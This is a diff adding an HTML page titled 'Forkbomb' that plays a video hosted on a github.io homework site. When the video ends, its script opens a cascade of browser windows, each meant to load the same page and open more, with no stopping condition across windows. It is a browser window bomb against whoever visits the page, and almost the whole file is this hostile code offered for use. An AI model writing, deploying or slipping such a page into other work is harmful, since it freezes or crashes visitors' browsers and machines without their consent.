@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forkbomb</title>
+    <script>
+        function openMultipleWindows(count = 5, delay = 500) {
+            let index = 0;
+            function openWindow() {
+                if (index < count) {
+                    let newWindow = window.open(window.location.href, '_blank', 'width=600,height=400,left=' + (index * 50) + ',top=' + (index * 50) + ',noopener,noreferrer');
+                    if (newWindow) {
+                        newWindow.focus();
+                        newWindow.onload = () => openMultipleWindows(count, delay);
+                    }
+                    index++;
+                    setTimeout(openWindow, delay);
+                }
+            }
+            openWindow();
+        }
+        
+        function onVideoEnd() {
+            setTimeout(() => openMultipleWindows(), 500);
+        }
+    </script>
+</head>
+<body>
+    <h1>Waiting for Video to Finish</h1>
+    <video width="640" height="360" controls onended="onVideoEnd()">
+        <source src="https://monosourcil3000.github.io/homework.github.io/video.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+    <p>Once the video finishes playing, new windows will open.</p>
+</body>
+</html>
